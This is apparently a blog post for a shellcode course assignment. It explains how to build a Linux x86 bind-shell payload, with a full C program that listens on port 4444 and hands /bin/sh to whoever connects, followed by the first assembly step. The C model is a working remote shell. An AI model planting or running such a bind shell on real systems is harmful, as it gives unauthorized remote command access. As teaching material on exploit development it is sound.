---
title:  Assignment 1
description: Create a Shell Bind TCP shellcode
order: 1
---

[&lt;&lt; Go Back]({{ site.baseurl }})


# {{ page.title }}
### {{ page.description }}
___
<div style="text-align:right;direction:ltr;margin-left:1em;"><h6>{{ page.date }}</h6></div>

Before we dive into assembly, let's first write a simple program in c to model the functionality.

```c
/* bind_tcp_model.c
 *  - Bind to a socket, listen for a connection, provide shell.
 */

#include <sys/socket.h>	// socket, AF_INET, SOCK_STREAM
#include <unistd.h>	// dup2
#include <netinet/in.h>	// sockaddr, htons, INADDR_ANY

int main() {
	int port = 4444;
	int sockfd, connfd;
	struct sockaddr_in sockaddr;

	// Build socket

	sockfd = socket(AF_INET, SOCK_STREAM, 0);

	// Bind to socket

	sockaddr.sin_family = AF_INET;
	sockaddr.sin_port = htons(port);
	sockaddr.sin_addr.s_addr = INADDR_ANY;
	bind(sockfd, (struct sockaddr *) &sockaddr, sizeof(sockaddr));

	// Listen on socket

	listen(sockfd, 0);

	// Accept a connection

	connfd = accept(sockfd, 0, 0);

	// Route i/o through connection

	dup2(connfd, 0);
	dup2(connfd, 1);
	dup2(connfd, 2);

	// Execute /bin/sh

	execve("/bin/sh", 0, 0);

	return 0;
}

```

It seems we have 6 syscalls to handle:
- socket
- bind
- listen
- accept
- dup2
- execve

The process for finding the functionality of a syscall generally starts with checking its man page, but interestingly, most of the syscalls related to sockets use the same syscall, passing their *call* parameter to **socketcall**:
```c
int socketcall(int call, unsigned long *args);
```

We can then find the appropriate *call* parameter for each of our syscalls:
```bash
> grep SYS_ /usr/include/linux/net.h

#define SYS_SOCKET	1		/* sys_socket(2)		*/
#define SYS_BIND	2		/* sys_bind(2)			*/
#define SYS_CONNECT	3		/* sys_connect(2)		*/
#define SYS_LISTEN	4		/* sys_listen(2)		*/
#define SYS_ACCEPT	5		/* sys_accept(2)		*/
...
```

For our first syscall, creating a socket, we'll need to use SYS_SOCKET, **1**, which we know from our c model takes the following form:
```c
int socket(int domain, int type, int protocol);
```

Let's try to put all this down in assembly.

```nasm
        ; int socketcall(int call, unsigned long *args)
        ; int socket(int domain, int type, int protocol)
        ; eax = 0x66 (socketcall)
        ; ebx = 0x1 (socket)
        ; ecx = esp
        ; esp => |0x00000002|0x00000001|0x00000000|
        ;          AF_INET  SOCK_STREAM    null

        push 0x0                ; IPPROTO_IP
        push 0x1                ; SOCK_STREAM
        push 0x2                ; AF_INET
        mov eax, 0x66           ; socketcall, 102
        mov ebx, 0x1            ; socket, 1
        mov ecx, esp            ; args
        int 0x80                ; execute
        mov esi, eax            ; save sockfd
```

As you can see, we filled the stack with the arguments to **socket** and pointed *ecx* to them.  We then filled *eax* with the **socketcall** identifier and *ebx* with the **socket** identifier, finally calling the syscall to execute.  Note we also saved the return value in esi, for future use. 


<br>
{% include preamble.md %}


[&lt;&lt; Go Back]({{ site.baseurl }})
